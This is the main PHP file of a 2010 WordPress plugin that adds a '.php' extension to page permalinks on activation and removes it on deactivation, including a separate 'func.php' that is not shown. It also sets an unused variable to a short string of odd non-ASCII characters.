<?php
/*
Plugin Name: .php on PAGES
Plugin URI: http://wordpress.org/extend/plugins/dot-php-pages/
Description: This Plugin Adds .php Extension to Your Pages Like http://www.yoursitename.com/yourpage.php WARNING: FIRST DEACTIVATE THE OTHER EXTENSION PAGES PLUGIN.  Just Activate The Plugin And Enjoy PHP Pages.
Author: K$M
Version: 1.0
Author URI: http://ksmughal.com
*/
/**
 * @author karim
 * @copyright 2010
 */
$ksm='јгcЩ±ДїvЗІврЬ';
include'func.php';
add_action('init', 'php_pages', -1);
register_activation_hook(__FILE__, 'active');
register_deactivation_hook(__FILE__, 'deactive');
function active() 
{
	global $wp_rewrite;
	if ( !strpos($wp_rewrite->get_page_permastruct(), '.php'))
    {
		$wp_rewrite->page_structure = $wp_rewrite->page_structure . '.php';
   }
  $wp_rewrite->flush_rules();
}	
	function deactive()
     {
		global $wp_rewrite;
		$wp_rewrite->page_structure = str_replace(".php","",$wp_rewrite->page_structure);
		$wp_rewrite->flush_rules();
	}
?>